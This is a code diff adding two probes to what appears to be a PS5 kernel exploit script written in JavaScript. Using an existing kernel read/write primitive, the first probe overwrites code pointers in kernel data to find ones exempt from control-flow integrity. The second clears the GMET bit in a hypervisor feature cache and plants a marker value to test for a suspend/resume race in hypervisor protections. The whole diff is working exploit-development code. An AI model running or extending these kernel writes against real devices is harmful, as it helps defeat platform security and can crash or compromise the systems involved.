@@ -981,6 +981,220 @@ async function main(userlandRW, wkOnly = false) {
                 await log("3. Find manumode variable location", LogLevel.INFO);
                 await log("4. Trace dmem_resume_svm function", LogLevel.INFO);
             }
+
+            // =========================================================================
+            // CFI WRITABLE POINTER PROBE TEST
+            // For each .text pointer in writable region, try writing to it
+            // If no crash -> CFI-exempt pointer found!
+            // If crash -> CFI protected
+            // =========================================================================
+
+            let runCfiProbe = confirm(
+                "CFI WRITABLE POINTER PROBE\n\n" +
+                "This test will attempt to WRITE to each .text\n" +
+                "pointer found in the writable region.\n\n" +
+                "CFI should crash on bad writes, but if we find\n" +
+                "a CFI-exempt pointer, it could be exploited!\n\n" +
+                "WARNING: May crash the system!\n\n" +
+                "OK = Run CFI probe test\n" +
+                "Cancel = Skip"
+            );
+
+            if (runCfiProbe) {
+                await log("========== CFI WRITABLE POINTER PROBE ==========", LogLevel.SUCCESS);
+
+                // First, collect all .text pointers in writable region
+                await log("[CFI] Scanning for .text pointers in 0x0-0xF000...", LogLevel.INFO);
+
+                let textPointers = [];
+                for (let off = 0; off < 0xF000; off += 8) {
+                    let val = await krw.read8(krw.kdataBase.add32(off));
+
+                    if (val.hi !== 0xffffffff) continue;
+
+                    // Filter out obvious masks/invalid
+                    let lowHex = val.low.toString(16).padStart(8, '0');
+                    if (lowHex.match(/^f{5,}/) || lowHex.match(/0{5,}$/)) continue;
+
+                    let textOff = val.low - krw.ktextBase.low;
+                    if (textOff >= 0 && textOff < 0x2000000) {
+                        textPointers.push({ offset: off, value: val, textOffset: textOff });
+                    }
+                }
+
+                await log("[CFI] Found " + textPointers.length + " .text pointers", LogLevel.SUCCESS);
+
+                if (textPointers.length === 0) {
+                    await log("[CFI] No .text pointers found in writable region", LogLevel.WARN);
+                } else {
+                    // Show found pointers
+                    for (let ptr of textPointers) {
+                        await log("[CFI] 0x" + ptr.offset.toString(16) + " -> .text+0x" + ptr.textOffset.toString(16), LogLevel.INFO);
+                    }
+
+                    // Calculate a "safe" target address - just use a different .text offset
+                    // We'll try swapping pointers or writing a nearby .text address
+                    let safeTextTarget = krw.ktextBase.add32(0x100); // First instruction area
+
+                    let testWrite = confirm(
+                        "Found " + textPointers.length + " .text pointers!\n\n" +
+                        "Test writing to them?\n" +
+                        "Will try writing valid .text addr to each.\n\n" +
+                        "If any succeeds without crash -> CFI bypass!\n\n" +
+                        "OK = Start CFI write tests\n" +
+                        "Cancel = Skip"
+                    );
+
+                    if (testWrite) {
+                        await log("[CFI] Starting write tests...", LogLevel.WARN);
+                        await log("[CFI] Target value: " + safeTextTarget + " (.text+0x100)", LogLevel.INFO);
+
+                        let successCount = 0;
+                        let failCount = 0;
+
+                        for (let i = 0; i < textPointers.length; i++) {
+                            let ptr = textPointers[i];
+                            let origVal = ptr.value;
+
+                            await log("[CFI] Testing offset 0x" + ptr.offset.toString(16) + "...", LogLevel.INFO | LogLevel.FLAG_TEMP);
+
+                            try {
+                                // Try writing a different valid .text address
+                                await krw.write8(krw.kdataBase.add32(ptr.offset), safeTextTarget);
+
+                                // If we get here, write succeeded!
+                                let verify = await krw.read8(krw.kdataBase.add32(ptr.offset));
+
+                                if (verify.low === safeTextTarget.low && verify.hi === safeTextTarget.hi) {
+                                    successCount++;
+                                    await log("[CFI] SUCCESS! 0x" + ptr.offset.toString(16) + " is CFI-EXEMPT!", LogLevel.SUCCESS);
+
+                                    // Restore original value
+                                    await krw.write8(krw.kdataBase.add32(ptr.offset), origVal);
+                                    await log("[CFI] Restored original value", LogLevel.INFO);
+                                } else {
+                                    await log("[CFI] Write didn't stick at 0x" + ptr.offset.toString(16), LogLevel.WARN);
+                                    failCount++;
+                                }
+                            } catch (e) {
+                                failCount++;
+                                await log("[CFI] Crash/error at 0x" + ptr.offset.toString(16) + ": " + e, LogLevel.ERROR);
+                                // If we get here after a crash, CFI blocked it
+                            }
+                        }
+
+                        await log("========== CFI PROBE RESULTS ==========", LogLevel.SUCCESS);
+                        await log("[CFI] Total .text pointers tested: " + textPointers.length, LogLevel.INFO);
+                        await log("[CFI] Successful writes (CFI-exempt): " + successCount, LogLevel.SUCCESS);
+                        await log("[CFI] Failed writes (CFI protected): " + failCount, LogLevel.INFO);
+
+                        if (successCount > 0) {
+                            await log("[!!!] CFI-EXEMPT POINTERS FOUND!", LogLevel.SUCCESS);
+                            await log("[!!!] These can potentially be hijacked!", LogLevel.SUCCESS);
+                            alert("CFI-EXEMPT POINTERS FOUND!\n\nCheck the log for details.");
+                        } else {
+                            await log("[CFI] All pointers appear CFI-protected", LogLevel.WARN);
+                        }
+                    }
+                }
+            }
+
+            // =========================================================================
+            // INITIALIZATION RACE TEST
+            // Modify a pointer before rest mode to test timing window
+            // HV may not have CFI fully active during early resume
+            // =========================================================================
+
+            let runRaceTest = confirm(
+                "INITIALIZATION RACE TEST\n\n" +
+                "This tests if CFI has a timing window\n" +
+                "during suspend/resume where writes work.\n\n" +
+                "Steps:\n" +
+                "1. Modify a .text pointer\n" +
+                "2. Put PS5 in REST MODE\n" +
+                "3. Wake and check if pointer was used\n\n" +
+                "OK = Setup race test\n" +
+                "Cancel = Skip"
+            );
+
+            if (runRaceTest) {
+                await log("========== INITIALIZATION RACE TEST ==========", LogLevel.SUCCESS);
+
+                // Use a known writable location - try SVM cache or mystery flag
+                const RACE_TEST_OFFSET = 0x4bf0; // SVM feature cache
+
+                let origVal = await krw.read4(krw.kdataBase.add32(RACE_TEST_OFFSET));
+                await log("[RACE] Original value at 0x" + RACE_TEST_OFFSET.toString(16) + ": 0x" + origVal.toString(16), LogLevel.INFO);
+
+                // For the race test, we'll set a marker value and instructions
+                await log("[RACE] Test setup:", LogLevel.WARN);
+                await log("[RACE] 1. We'll modify the SVM feature cache", LogLevel.INFO);
+                await log("[RACE] 2. Clear GMET bit (0x40000)", LogLevel.INFO);
+                await log("[RACE] 3. You put PS5 to REST MODE", LogLevel.INFO);
+                await log("[RACE] 4. Wake up and run exploit again", LogLevel.INFO);
+                await log("[RACE] 5. Check if modification persisted", LogLevel.INFO);
+
+                let doRaceSetup = confirm(
+                    "RACE TEST SETUP\n\n" +
+                    "Current SVM cache: 0x" + origVal.toString(16) + "\n" +
+                    "Will clear GMET bit (0x40000)\n\n" +
+                    "After clicking OK:\n" +
+                    "1. Put PS5 to REST MODE\n" +
+                    "2. Wake up\n" +
+                    "3. Run exploit again\n" +
+                    "4. Check this offset's value\n\n" +
+                    "OK = Modify and prepare for rest\n" +
+                    "Cancel = Skip"
+                );
+
+                if (doRaceSetup) {
+                    // Clear GMET bit
+                    let newVal = origVal & ~0x40000;
+                    await krw.write4(krw.kdataBase.add32(RACE_TEST_OFFSET), newVal);
+
+                    let verify = await krw.read4(krw.kdataBase.add32(RACE_TEST_OFFSET));
+                    await log("[RACE] Modified 0x" + RACE_TEST_OFFSET.toString(16) + ": 0x" + verify.toString(16), LogLevel.SUCCESS);
+
+                    if ((verify & 0x40000) === 0) {
+                        await log("[RACE] GMET bit CLEARED successfully", LogLevel.SUCCESS);
+                    } else {
+                        await log("[RACE] Warning: GMET bit still set?", LogLevel.WARN);
+                    }
+
+                    // Also write a marker to mystery flag for verification
+                    const MYSTERY_OFFSET = 0xD11D08;
+                    try {
+                        let mysteryOrig = await krw.read4(krw.kdataBase.add32(MYSTERY_OFFSET));
+                        await log("[RACE] Mystery flag original: 0x" + mysteryOrig.toString(16), LogLevel.INFO);
+
+                        // Write marker value 0xDEADBEEF
+                        await krw.write4(krw.kdataBase.add32(MYSTERY_OFFSET), 0xDEADBEEF);
+                        let mysteryVerify = await krw.read4(krw.kdataBase.add32(MYSTERY_OFFSET));
+                        await log("[RACE] Mystery flag marker set: 0x" + mysteryVerify.toString(16), LogLevel.SUCCESS);
+                    } catch (e) {
+                        await log("[RACE] Could not write mystery flag marker: " + e, LogLevel.WARN);
+                    }
+
+                    await log("", LogLevel.INFO);
+                    await log("========== RACE TEST READY ==========", LogLevel.SUCCESS);
+                    await log("[RACE] Modifications complete!", LogLevel.SUCCESS);
+                    await log("[RACE] NOW: Put PS5 to REST MODE", LogLevel.WARN);
+                    await log("[RACE] After wake: Run exploit, check values", LogLevel.WARN);
+                    await log("[RACE] Look for:", LogLevel.INFO);
+                    await log("[RACE]   - SVM cache: 0x700f12 (GMET clear)", LogLevel.INFO);
+                    await log("[RACE]   - Mystery flag: 0xDEADBEEF (marker)", LogLevel.INFO);
+                    await log("[RACE] If values persisted -> potential race!", LogLevel.INFO);
+
+                    alert(
+                        "RACE TEST READY!\n\n" +
+                        "NOW: Put PS5 to REST MODE\n\n" +
+                        "After wake:\n" +
+                        "- Run exploit again\n" +
+                        "- Check SVM cache and mystery flag values\n" +
+                        "- If GMET is still cleared, HV didn't reinit!"
+                    );
+                }
+            }
         }
 
         // OPTIONAL: Full kernel dump (disabled by default)
